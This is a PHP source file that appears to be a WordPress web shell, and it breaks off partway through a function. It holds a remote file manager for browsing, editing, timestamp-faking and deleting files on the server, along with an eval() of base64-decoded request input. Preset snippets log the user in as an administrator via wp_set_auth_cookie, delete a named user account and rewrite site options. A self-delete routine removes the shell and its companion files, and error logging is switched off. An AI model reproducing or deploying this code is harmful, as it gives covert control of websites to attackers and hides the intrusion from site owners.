<?php
// if('11c5b718af2cea1de5bfb3bd8c98db2e' !== md5($_SERVER['HTTP_USER_AGENT'])){die('0b08bd98d279b88859b628cd8c061ae0');}

@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);

error_reporting(1);

header('Cache-Control: no-store, no-cache, must-revalidate');
header('Cache-Control: post-check=0, pre-check=0', FALSE);
header('Pragma: no-cache');


function get_perm($file){
  $perms = fileperms($file);

  switch ($perms & 0xF000) {
    case 0xC000:
        $info = 's';
        break;
    case 0xA000:
        $info = 'l';
        break;
    case 0x8000:
        $info = 'r';
        break;
    case 0x6000:
        $info = 'b';
        break;
    case 0x4000:
        $info = 'd';
        break;
    case 0x2000:
        $info = 'c';
        break;
    case 0x1000:
        $info = 'p';
        break;
    default:
        $info = 'u';
  }


  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));


  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));


  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));

  return $info;
}

function wsoViewSize($s) {

    if (is_int($s)) $s = sprintf("%u", $s);
    
    if($s >= 1073741824)  return sprintf('%1.2f', $s / 1073741824 ). '&nbsp;<font color=red>Gb</font>&nbsp;';

    elseif ($s >= 1048576) return sprintf('%1.2f', $s / 1048576 ) . '&nbsp;<font color=green>Mb</font>&nbsp;';

    elseif($s >= 1024) return sprintf('%1.2f', $s / 1024 ) . '&nbsp;<font color=blue>Kb</font>&nbsp;';

    else  return $s . '&nbsp;<font color=black size-1>B</font>&nbsp;';
}

if(get_magic_quotes_gpc()) {
    function SStripslashes($array) {
      return is_array($array) ? array_map('SStripslashes', $array) : stripslashes($array);
    }
    $_POST = SStripslashes($_POST);
    $_COOKIE = SStripslashes($_COOKIE);
}

if(!function_exists('file_put_contents')) {
    function file_put_contents($file_name, $data) {
        $f = fopen($file_name,"w");
        fputs($f,$data);
        fclose($f);
    }
} 

if (function_exists('set_magic_quotes_runtime')) {
    
    @set_magic_quotes_runtime(0);
}

function suicide(){ 
    if(function_exists('update_option')){
    	setcookie(get_option('dolly_work'),'',time()-3600);
      	update_option('hello_dolly', '', true );
      	update_option('dolly_work', '', true );
    } else {
    	@unlink(__FILE__);
    }
    
    @unlink('config_wp.php');
    @unlink('ii.php');
    @unlink('zpl.php');
    @unlink('pl.php');
    @unlink('2pl.php');
    @unlink('cpl.php');
    @unlink('upl.php');
    @unlink('_task');
    @unlink('_task_n');
    @unlink('_taskc');
    @unlink('_task_nc');
    @unlink('_task_nn');
    @unlink('_worker.php');
    @unlink('_log');
    @unlink('_cleaner.php');
    @unlink('_error_log');
    @unlink('big_log');
    @unlink('wp_log');
    @unlink('manual_log');
  
    die('God job!');
}

function echo_header(){

	echo "<!DOCTYPE html><html><meta charset=utf-8>\n";
	echo "<style>
	span {
  	background: url(data:image/gif;base64,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) no-repeat 0 0;
  	width: 48px;
  	height: 48px;
  	display: block;
  	float: left;
  	cursor:pointer;
  	}
  	span.m2 {background-position: -96px 0;}
  	span.m3 {background-position: -48px 0;}
  	span.m4 {background-position: -192px 0;}
  	span.m5 {background-position: -144px 0;}
  	span:hover {background-color: #eee;}
  	</style>\n";
}

function echo_scripts(){
	
	echo "<script>var myVar;\n";

  echo "function setCookie(c_name,value,exdays) { var exdate=new Date(); exdate.setDate(exdate.getDate() + exdays); var c_value=escape(value) + ((exdays==null) ? \"\" : \"; expires=\"+exdate.toUTCString()); document.cookie=c_name + \"=\" + c_value; }\n";

  echo "function getCookie(cname) {
  var name = cname + '=';
  var decodedCookie = decodeURIComponent(document.cookie);
  var ca = decodedCookie.split(';');
  for(var i = 0; i <ca.length; i++) {
    var c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return '';
  }";

  echo "function Filter(){
    var filt = getCookie('filter');
    var filter = prompt('Exception?', filt);
    
    var date = new Date();date.setTime(date.getTime()+(100*24*60*60*1000));
    document.cookie = 'filter='+filter+'; expires=' + date.toGMTString();
  }\n";

  echo "function Force(){
    var filename = location.href.replace(/^.*[\\\/]/, '');
    var newloc = location.href.replace(filename, '_worker.php?fsdfsfdffs');
    location.href = newloc;
  }
  ";
  echo "function Fast(){

    if('Fast scan off' == document.getElementById('fast_worker').value){
    var date = new Date();date.setTime(date.getTime()+(100*24*60*60*1000));
    document.getElementById('fast_worker').value = 'Fast scan on';
    } else {
    var date = new Date();date.setTime(date.getTime()-(100*24*60*60*1000));  
    document.getElementById('fast_worker').value = 'Fast scan off';
    }
    document.cookie = 'fast_worker=true; expires=' + date.toGMTString();
  }";

  echo "function Paranoid(){

    if('Paranoid scan off' == document.getElementById('paranoid_worker').value){
    var date = new Date();date.setTime(date.getTime()+(100*24*60*60*1000));
    document.getElementById('paranoid_worker').value = 'Paranoid scan on';
    } else {
    var date = new Date();date.setTime(date.getTime()-(100*24*60*60*1000));  
    document.getElementById('paranoid_worker').value = 'Paranoid scan off';
    }
    document.cookie = 'paranoid_worker=true; expires=' + date.toGMTString();
  }";
	echo "function setCookie(c_name,value,exdays) { var exdate=new Date(); exdate.setDate(exdate.getDate() + exdays); var c_value=escape(value) + ((exdays==null) ? \"\" : \"; expires=\"+exdate.toUTCString()); document.cookie=c_name + \"=\" + c_value; }\n";

	echo "function Worker(action, dir, file, code, param, target){
		
    if(action != 'suicide'){
    document.getElementById(target).contentWindow.document.write('<!DOCTYPE html><html lang=\"en\"><style>.lds-spinner {  color: official;  display: inline-block;  position: relative;  width: 80px;  height: 80px;}.lds-spinner div {  transform-origin: 40px 40px;  animation: lds-spinner 1.2s linear infinite;}.lds-spinner div:after {  content: \" \";  display: block;  position: absolute;  top: 3px;  left: 37px;  width: 6px;  height: 18px;  border-radius: 20%;  background: #000;}.lds-spinner div:nth-child(1) {  transform: rotate(0deg);  animation-delay: -1.1s;}.lds-spinner div:nth-child(2) {  transform: rotate(30deg);  animation-delay: -1s;}.lds-spinner div:nth-child(3) {  transform: rotate(60deg);  animation-delay: -0.9s;}.lds-spinner div:nth-child(4) {  transform: rotate(90deg);  animation-delay: -0.8s;}.lds-spinner div:nth-child(5) {  transform: rotate(120deg);  animation-delay: -0.7s;}.lds-spinner div:nth-child(6) {  transform: rotate(150deg);  animation-delay: -0.6s;}.lds-spinner div:nth-child(7) {  transform: rotate(180deg);  animation-delay: -0.5s;}.lds-spinner div:nth-child(8) {  transform: rotate(210deg);  animation-delay: -0.4s;}.lds-spinner div:nth-child(9) {  transform: rotate(240deg);  animation-delay: -0.3s;}.lds-spinner div:nth-child(10) {  transform: rotate(270deg);  animation-delay: -0.2s;}.lds-spinner div:nth-child(11) {  transform: rotate(300deg);  animation-delay: -0.1s;}.lds-spinner div:nth-child(12) {  transform: rotate(330deg);  animation-delay: 0s;}@keyframes lds-spinner {  0% {    opacity: 1;  }  100% {    opacity: 0;  }}</style><br><br><center><div class=\"lds-spinner\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>');
    }

    var ele = document.getElementsByName('work_method');
    for(i = 0; i < ele.length; i++) { 
                if(ele[i].checked) 
                work_method = ele[i].value; 
            } 
    if (action == 's_f'){work_method = 'post';}
    document.getElementById('action').value = action;
		document.getElementById('dir').value = dir;
		document.getElementById('file').value = file;
		document.getElementById('code').value = code;
		document.getElementById('param').value = param;
    document.getElementById('worker').method = work_method;
		document.getElementById('worker').target = target;
		document.getElementById('worker').submit();
	}\n";
	echo "function MakeHome(){
		Worker('f_m','','','','','file_man');
	}\n";
	echo "function base64EncodeUnicode(str) {
 
    utf8Bytes = encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
            return String.fromCharCode('0x' + p1);
    });
    return btoa(utf8Bytes);
	}
	function Make_worker(start){
		Worker('m_w', start, '', '', '', 'worker_box');
	}

  function FindEx(cod){
    text = atob(cod);
    var iframe = document.getElementById('edit_box');
var input = iframe.contentWindow.document.getElementById('text');
input.selectionStart = input.value.indexOf(text);
input.selectionEnd = input.value.indexOf(text) + text.length;
input.focus ();
  }

	</script>\n";
}

function check_functions(){
	
	$need_func[] = 'openssl_verify';
	$need_func[] = 'curl_init';
	foreach ($need_func as $fu) {
    	echo function_exists($fu) ? "" : "<script>alert('$fu not present');</script>\n";
  	}
}

function to_worker(){
	
	$startdir =  dirname(__FILE__);
	
  	$z = explode(DIRECTORY_SEPARATOR,trim($startdir,DIRECTORY_SEPARATOR));
  	$bigdir = '';
  	$towrite = '<a style=\'cursor:pointer\' onclick=Make_worker(\'' . base64_encode('/') . '\')>[/]</a>';
  	foreach($z as $t){
    	$bigdir = $bigdir . DIRECTORY_SEPARATOR . $t;
    	if(@is_readable($bigdir)){
      		$color = 'green'; 
    	} else {
      	$color = 'red';
    	}
    	$towrite = $towrite . "<a style='cursor:pointer' onclick=Make_worker('" . base64_encode($bigdir) . "')>/<font color=$color>$t</font></a>";
    	
  	}
  	return $towrite;
}

function big_table(){

	$un = php_uname(); 
	$towrite = to_worker();
	echo "<table border=0 width=100%><tr><td style='width:500px'>$un</td>";
  echo "<td><input type=button onclick='Force();' value='Force worker'></td>";
  echo "<td><input type=button onclick='Fast();' id='fast_worker' value='Fast scan off'></td>";
  echo "<td><input type=button onclick='Paranoid();' id='paranoid_worker' value='Paranoid scan off'></td>";
  echo "<td><input type=button onclick='Filter();' id='filter' value='Add filter'></td>";
  echo "<td>  <input type='radio' id='post' name='work_method' value='post' checked>
  <label for='post'>_POST</label><br>
  <input type='radio' id='get' name='work_method' value='get'>
  <label for='get'>_GET</label><br></td>";
  echo "<td style='width:240px'><a onclick=Worker('suicide','','','','','_top');><span class='m1'>&nbsp;</span></a><a onclick=Worker('e_p','','','','','edit_box');><span class='m2'>&nbsp;</span></a><a onclick=Worker('m_a','','','','','file_man');><span class='m3'>&nbsp;</span></a><a onclick=Worker('m_p','','','','','file_man');><span class='m4'>&nbsp;</span></a><a href=#  onclick=Worker('f_m','','','','','file_man');><span class='m5'>&nbsp;</span></a></td></tr></table>";
  echo "<style> a {border:none;outline: none;}a:visited { color: #0000cc;}</style> <table width=100% style='font-size:16px; padding: 5px;'><tr><td>";
  echo "Make_worker: $towrite </td>";
  echo "<td align=right></td><tr></table>";
  echo "<table width=100%><tr valign=top><td width=500><iframe id='file_man' name='file_man' src='' width=100% height=700 scrolling=yes></iframe></td><td width=450><iframe id='edit_box' name='edit_box' src='' width=100% height=700 scrolling=yes></iframe></td><td width=100><iframe id='worker_box' name='worker_box' src='' width=100% height=700 scrolling=yes></iframe></td></tr></table>\n";
}

function big_form(){
	echo '<form id="worker" action="?" traget="_self" method="POST">
	<input type="hidden" id="action" name="a" value="">
	<input type="hidden" id="dir" name="d" value="">
	<input type="hidden" id="file" name="f" value="">
	<input type="hidden" id="code" name="c" value="">
	<input type="hidden" id="param" name="p" value="">
	</form>';
}

function file_man_style(){
	echo '<style>
	table, th, td {  border: 0px;  border-collapse: collapse; width:100% }  
	tr:hover  {   background-color: #ebebeb;   }   
	th, td {     padding: 5px;   }  
	a {  font-size:15px; border:none;  outline: none; cursor:pointer; color:#00f; }   
	a:visited { color: #0000cc;} 
	</style>';
	echo "<script>function GoTo(){ dir=btoa(document.getElementById('gotodir').value);
	parent.Worker('f_m',dir,'','','','file_man');
	}</script>\n";
  echo "<script>function EditFile(){ file=btoa(document.getElementById('editfile').value);
  parent.Worker('e_f','aaa',file,'','','edit_box'); //tut
  }</script>\n";
}

function file_man(){
	
	file_man_style();

	if(isset($_REQUEST['d']) && '' !== $_REQUEST['d'] ){
  		$b = base64_decode($_REQUEST['d']);
	} else {
  		$b = realpath(dirname(__FILE__));
  	}
  $files = array();    
	$dirs = array();
    $z = explode(DIRECTORY_SEPARATOR,trim($b,DIRECTORY_SEPARATOR));
  	$bigdir = '';
  	$towrite = '';

    foreach($z as $t){
  
  		$bigdir = $bigdir . DIRECTORY_SEPARATOR . $t;
    
    	if(@is_readable($bigdir)){
      		$color = 'blue'; 
    	} else {
      		$color = 'red';
    	}
    
    	if(@is_writable($bigdir)){
      		$color = 'green'; 
    	}

	    $towrite = $towrite . "<a onclick = parent.Worker('f_m','". base64_encode($bigdir) ."','','','','file_man'); >/<font color=$color>$t</font></a>";
  	}

  	echo "<pre><a onclick = parent.Worker('f_m','','','','','file_man');>[home]</a> ";
  	echo "<a onclick = parent.Worker('f_m','". base64_encode('/')."','','','','file_man'); >[/]</a> ";
  	echo $towrite;
  	echo "<br><br><table>";

  	$odir = @opendir($b);

	while (($file = @readdir($odir)) !== FALSE){
 
  		if ($file == '.' || $file == '..'){
    		continue;
  		}

  		$curit = $b.DIRECTORY_SEPARATOR.$file;
  
  		if (is_dir($curit) && (!is_link($curit)) ){
    		$dirs[] = $file;
  		}
  
  		if (is_file($curit) && (!is_link($curit)) ){
    		$files[] = $file;
  		}
	}
  
	@closedir($odir);

	if (count($dirs) > 0) {
    	
    	sort($dirs);
    
    	foreach ($dirs as $curit){
      		if(@is_readable($b .DIRECTORY_SEPARATOR.$curit)){
        		$color = 'blue'; 
      		} else {
        		$color = 'red';
      		}

      		if(@is_writeable($b .DIRECTORY_SEPARATOR.$curit)){
        		$color = 'green'; 
      		}
      	$zxc = "<tr><td><a onclick = parent.Worker('f_m','". base64_encode($b . '/' . $curit) ."','','','','file_man'); ><font color=$color>[ $curit ]</font></a></td></tr>";
      	echo  $zxc;
    	}
  	}
 
  	echo '</table><br><table>';

    sort($files);
  	foreach ($files as $curit){
    	
    	if(@is_readable($b .DIRECTORY_SEPARATOR.$curit)){
      		$color = 'blue'; 
    	} else {
      		$color = 'red';
    	}

    	if(@is_writeable($b .DIRECTORY_SEPARATOR.$curit)){
      		$color = 'green'; 
    	} 
  
    	$file_size = wsoViewSize(filesize($b .DIRECTORY_SEPARATOR.$curit));
  
    	$file_time = date("d.m.Y", filemtime($b .DIRECTORY_SEPARATOR.$curit));
  
    	$perm = get_perm($bigdir . '/' . $curit);
  
    	$cfff = base64_encode($bigdir . '/' . $curit);
    	$cdir = base64_encode($bigdir);
      if(strlen($curit) > 30) {
    	 $curitw = '[...] ' . substr($curit, -23);
      } else {
        $curitw = $curit;
      }
    	echo "<tr id='$cfff'><td style='width:50px'><input type=button  onClick=parent.Worker('e_f','$cdir','$cfff','','reload','edit_box'); style='font-size:30px;height:45px;cursor:pointer' value='✐'>
    	</td><td style='width:50px'><input type=button  onClick=parent.Worker('m_f','$cdir','$cfff','','','edit_box'); style='font-size:25px;height:45px;cursor:pointer' value='🛠'></td>
    	<td><font size=+2 color=$color>";
      if('wp-config.php' === $curitw){
        echo "<span style='cursor:pointer' onClick=\"parent.Worker('m_wp','$cdir','$cfff','','noreload','edit_box');\">$curitw</span>";
      } else {
        if(strpos($curitw, '.suspected')> 0){
         echo "<span style='cursor:pointer' onClick=\"parent.Worker('r_s','$cdir','$cfff','','reload','edit_box');\">$curitw</span>";
        } else {
      echo $curitw;
        }
      }
      echo "</font><br><font size=+1>$perm</font></td><td>
    	<input type=button onClick=parent.Worker('d_f','$cdir','$cfff','','reload','edit_box'); style='font-size:25px;height:45px;cursor:pointer' value='🗑'></td>
    	<td> $file_size </td><td> $file_time </td></tr>";
  	}
  
  	echo '</table>';

	echo "<hr><input type=text id=gotodir><input type=button onClick=GoTo(); value='Goto dir'>";
  echo "<hr><input type=text id=editfile><input type=button onClick=EditFile(); value='Edit file'>";
	if (isset($_REQUEST['p'])){
		$id = $_REQUEST['p'];
		echo "<script>
  var elmnt = document.getElementById('$id');
  elmnt.scrollIntoView();
		</script>";
	}
}

function edit_file(){
	if(isset($_REQUEST['f']) && '' !== $_REQUEST['f']){
  		$f = $_REQUEST['f'];
  		$e = base64_decode($_REQUEST['f']);
	} else {
  		die('WTF?');
	}
	if(isset($_REQUEST['d']) && '' !== $_REQUEST['d']){
  		$dir = $_REQUEST['d'];
  	} else {
  		die('WTF?');
	}
	if(isset($_REQUEST['p']) && 'reload' == $_REQUEST['p']){
  		$param = 'reload';
	} else {
  		$param = 'no_reload';
	}
	echo '<!DOCTYPE html><html><meta charset=utf-8>';
	echo "<script>
	
	 function Scr_n(){
    code = document.getElementById('text').value;
        
    parent.Worker('s_n','$dir','$f',code,'$param','edit_box');
  }
	function Scr(){
  	code = parent.base64EncodeUnicode(document.getElementById('text').value);
	  	 	
  	parent.Worker('s_f','$dir','$f',code,'$param','edit_box');
	}</script>";
	if(file_exists($e)){

  if(!@is_writeable($e)) {
    chmod($e, 0644);
  }
  clearstatcache();

	$dis = ''; 
	if(!@is_writeable($e)) {
  		$dis = 'disabled';
	}

	$text = htmlentities(file_get_contents($e), ENT_QUOTES, "UTF-8");
    
	echo "<textarea id=text name=text style='width:100%;height:620px'>$text</textarea><input onclick=Scr_n(); type=button value='Save norm' $dis ><input onclick=Scr(); type=button value='Save 64' $dis ></form>";
  } else {
    echo '404 file not found';
  }
}

function save_norm(){
  
  if(isset($_REQUEST['f']) && '' !== $_REQUEST['f']){
    $fm = $_REQUEST['f'];
      $s = base64_decode($_REQUEST['f']);
  } else {
      die('WTF?');
  }
  
  if(isset($_REQUEST['c']) && '' !== $_REQUEST['c']){
      $text = $_REQUEST['c'];
  } else {
      die('WTF?');
  }
  
  if(isset($_REQUEST['p']) && '' !== $_REQUEST['p']){
      $param =$_REQUEST['p'];
  } else {
      die('WTF?');
  }
  
  if(isset($_REQUEST['d']) && '' !== $_REQUEST['d']){
    $dir = $_REQUEST['d'];
  } else {
    die('WTF?');
  }

  $text = str_replace(array("\r\n", "\r", "\n"), PHP_EOL,$text);
    @clearstatcache();
    $time = filemtime($s);
    
    $f = fopen($s,"w");
    fputs($f,$text);
    fclose($f);
    
    @clearstatcache();
    
    if (touch($s,$time+10,$time+10)) {
      echo "touch OK";
    } else {
      echo "touch bad";
    }
  
    if($param == 'reload'){
      echo "<script>parent.Worker('f_m','$dir','', '','$fm','file_man');</script>";
    }
}

function save_file(){
	
	if(isset($_REQUEST['f']) && '' !== $_REQUEST['f']){
		$fm = $_REQUEST['f'];
  		$s = base64_decode($_REQUEST['f']);
	} else {
  		die('WTF?');
	}
	
	if(isset($_REQUEST['c']) && '' !== $_REQUEST['c']){
  		$text = base64_decode($_REQUEST['c']);
	} else {
  		die('WTF?');
	}
	
	if(isset($_REQUEST['p']) && '' !== $_REQUEST['p']){
  		$param =$_REQUEST['p'];
	} else {
  		die('WTF?');
	}
	
	if(isset($_REQUEST['d']) && '' !== $_REQUEST['d']){
  	$dir = $_REQUEST['d'];
	} else {
  	die('WTF?');
	}

	$text = str_replace(array("\r\n", "\r", "\n"), PHP_EOL,$text);
  	@clearstatcache();
  	$time = filemtime($s);
  	
  	$f = fopen($s,"w");
  	fputs($f,$text);
  	fclose($f);
  	
  	@clearstatcache();
  	
  	if (touch($s,$time+10,$time+10)) {
    	echo "touch OK";
  	} else {
    	echo "touch bad";
  	}
 	
  	if($param == 'reload'){
  		echo "<script>parent.Worker('f_m','$dir','', '','$fm','file_man');</script>";
  	}
}

function delete_file(){

	if(isset($_REQUEST['f']) && '' !== $_REQUEST['f']){
  	$file_to_delete = base64_decode($_REQUEST['f']);
	} else {
  	die('WTF?');
	}
	
	if(isset($_REQUEST['p']) && '' !== $_REQUEST['p']){
  	$param =$_REQUEST['p'];
	} else {
  	die('WTF?');
	}
	
	if(isset($_REQUEST['d']) && '' !== $_REQUEST['d']){
  	$dir = $_REQUEST['d'];
	} else {
    die('WTF?');
	}

  if(isset($_REQUEST['c']) && '' !== $_REQUEST['c']){
    $code = $_REQUEST['c'];
  }
	
  if('suspected' == $code){
    copy($file_to_delete,$file_to_delete . '.suspected');
  }

  if (unlink($file_to_delete)){ 
    	
    	if('reload' == $param){
      		echo "<script>parent.Worker('f_m','$dir','', '','','file_man');</script>";
      	}
      	die("Succes: $file_to_delete");
        
    } else {
    	die('Deleting fail');
    }
}

function exec_php(){
	
	if(isset($_REQUEST['c']) && '' !== $_REQUEST['c']){
		eval (base64_decode($_REQUEST['c']));
		echo "<hr>";
	}
	
	$pos = strpos(__FILE__,'wp-content');
  	$wdir = substr(__FILE__,0,$pos);
  	echo "<script>
function Excod(cod){
if(cod == 'admin'){
code = `
\$pos = strpos(__FILE__,'wp-content');
\$wpc = substr(__FILE__,0,\$pos) . 'wp-config.php';
include(\$wpc);

\$users = get_users( array('role'   => 'administrator', ) );
\$ids = wp_list_pluck( \$users, 'ID' );
\$id = \$ids['0'];
wp_set_auth_cookie( \$id );


\$url = get_option('siteurl');
\$zzz =  '<a target=_blank href=' . \$url . '/wp-admin/plugins.php>admin</a>';
echo \$zzz;
`;
}
if(cod == 'delete_evil'){
code = `include('$wdir' . 'wp-config.php');
require_once ('$wdir' . 'wp-admin/includes/user.php');
\$user = get_user_by( 'email', 'sehefow374@mailimail.com' );
wp_delete_user(\$user->id);`;
}
if(cod == 'copy_zpl'){
code = `copy('zpl.php','zpl.php');`;
}
if(cod == 'phpinfo'){
code = `phpinfo();`;
}
if(cod == 'touch'){
code = `touch('i.php');`;
}
if(cod == 'restore'){
code = `\$host = \$_SERVER['HTTP_HOST'];
if(\$_SERVER['HTTPS'] == 'on'){
\$data = 'https://'.\$host;
} else {
\$data = 'http://'.\$host;
}
\$pos = strpos(__FILE__,'wp-content');
\$wpc = substr(__FILE__,0,\$pos) . 'wp-config.php';
include(\$wpc);
update_option( 'siteurl', \$data);
update_option( 'home', \$data);
die();`;
}
document.getElementById('text').value = code;
}
function crppp(){
code = parent.base64EncodeUnicode(document.getElementById('text').value);
		 	
parent.Worker('e_p','','',code,'','edit_box');
}
</script>";
	
	echo "<a onclick=Excod('admin'); style='cursor:pointer; color:#00f'>Admin</a> _<a onclick=Excod('phpinfo'); style='cursor:pointer; color:#00f'>PHPinfo</a> _ <a onclick=Excod('delete_evil'); style='cursor:pointer; color:#00f'>R_Evil</a> _ <a onclick=Excod('copy_zpl'); style='cursor:pointer; color:#00f'>Copy Zpl</a> _ <a onclick=Excod('restore'); style='cursor:pointer; color:#00f'>Restore home</a> _ <a onclick=Excod('touch'); style='cursor:pointer; color:#00f'>touch</a><br>";

	echo "<textarea id=text name=cod style='width:100%;height:420px'></textarea><input type=button onclick=crppp(); value=Eval >";
}


function make_worker(){
	
	if(isset($_REQUEST['d']) && '' !== $_REQUEST['d']){
		$st_dir = base64_decode($_REQUEST['d']);
	} else {
		die('WTF?');
	}
 	file_put_contents('_task', "$st_dir" . PHP_EOL);
  
